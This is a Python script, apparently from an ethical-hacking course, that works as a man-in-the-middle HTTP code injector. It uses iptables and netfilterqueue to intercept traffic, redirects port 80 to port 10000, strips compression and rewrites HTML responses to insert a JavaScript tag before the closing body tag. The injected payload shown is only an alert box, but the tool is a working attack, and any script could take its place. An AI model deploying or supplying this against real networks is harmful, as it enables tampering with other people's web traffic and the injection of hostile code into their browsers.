#!usr/bin/env python
import scapy.all as scapy
import netfilterqueue
import subprocess
import re
import sys


injection_count = 0


def set_load (packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    try:
        del packet[scapy.TCP].chksum
    except IndexError:
        print("Found")
        
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
        elif scapy_packet[scapy.TCP].sport == 10000:
            injection_code = '<script>alert("gotcha")</script>'
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
            injector_count = injection_count + 1
            print("\r[+] Sent " + str(injector_count) + " Injections"),
            sys.stdout.flush()

    packet.accept()


#subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
#subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000", shell=True)


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Closing Code Injector...")
    subprocess.call("iptables --flush", shell=True)
